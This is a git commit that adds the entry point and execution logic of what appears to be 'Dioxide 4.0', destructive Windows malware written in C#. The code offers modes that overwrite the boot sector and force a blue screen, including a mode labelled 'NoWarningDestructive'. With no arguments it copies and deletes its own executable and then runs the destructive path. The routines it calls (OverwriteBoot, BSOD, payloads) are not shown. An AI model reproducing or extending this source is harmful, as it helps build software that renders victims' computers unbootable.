45cc23e3ae298260d9bccd04369d9136d78ec21c
Mist <59188378+Mist0090@users.noreply.github.com>
2022-03-08 19:20:25 +0900

    Add files via upload

---
+++ dioxide4.0/main-Dioxide/execute.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.Threading;
+using System.Windows.Forms;
+using DIOXIDE.Properties;
+using DIOXIDE;
+
+namespace DIOXIDE
+{
+    class execute
+    {
+        public static void executeEWP()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+
+            destruction.WARNING();
+
+            payloads.CreateWaveFile();
+
+            Thread.Sleep(5000);
+
+            run_payloads.PStart();
+
+            Environment.Exit(0);
+        }
+        public static void executeNWD()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+
+            payloads.CreateWaveFile();
+
+            destruction.OverwriteBoot();
+
+            Thread.Sleep(5000);
+
+            run_payloads.DStart();
+
+            destruction.BSOD();
+        }
+        public unsafe static void executeP()
+        {
+            payloads payloads = new payloads();
+            run_payloads run_payloads = new run_payloads();
+
+            Application.EnableVisualStyles();
+
+            payloads.CreateWaveFile();
+
+            Thread.Sleep(5000);
+
+            run_payloads.PStart();
+
+            System.Environment.Exit(0);
+        }
+        public static void executeD()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+
+            destruction.WARNING();
+
+            payloads.CreateWaveFile();
+
+            destruction.OverwriteBoot();
+
+            Thread.Sleep(5000);
+
+            run_payloads.DStart();
+
+            destruction.BSOD();
+        }
+    }
+}
---
+++ dioxide4.0/main-Dioxide/main.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using System.IO;
+using System.Windows.Forms;
+
+namespace DIOXIDE
+{
+    class main
+    {
+        static void Main(string[] cmd)
+        {
+            Functions func = new Functions();
+            Application.EnableVisualStyles();
+
+            if (cmd.Length == 0)
+            {
+                if (File.Exists(func.TempPath + "Dioxide."))
+                {
+                    func.DeleteDioxideEXECache();
+                    execute.executeD();
+                }
+                else
+                {
+                    func.DioxideEXECachCreate();
+                    func.DioxideEXECopy();
+                    func.DeleteDioxideEXE();
+                }
+            }
+            else
+            {
+                for (int i = 0; i < cmd.Length; i++)
+                {
+                    if (cmd[i] == "/P")
+                    {
+                        execute.executeP();
+                    }
+                    if (cmd[i] == "/D")
+                    {
+                        execute.executeD();
+                    }
+                    if (cmd[i] == "/NWD")
+                    {
+                        execute.executeNWD();
+                    }
+                    if (cmd[i] == "/EWP")
+                    {
+                        execute.executeEWP();
+                    }
+                    if (cmd[i] == "/help")
+                    {
+                        MessageBox.Show("/P Peaceful" + Environment.NewLine + "/D Destructive" + Environment.NewLine + "/NWD NoWarningDestructive" + Environment.NewLine + "/EWP EnabledWarningPeaceful", "help", MessageBoxButtons.OK);
+                    }
+                }
+            }
+        }
+    }
+}
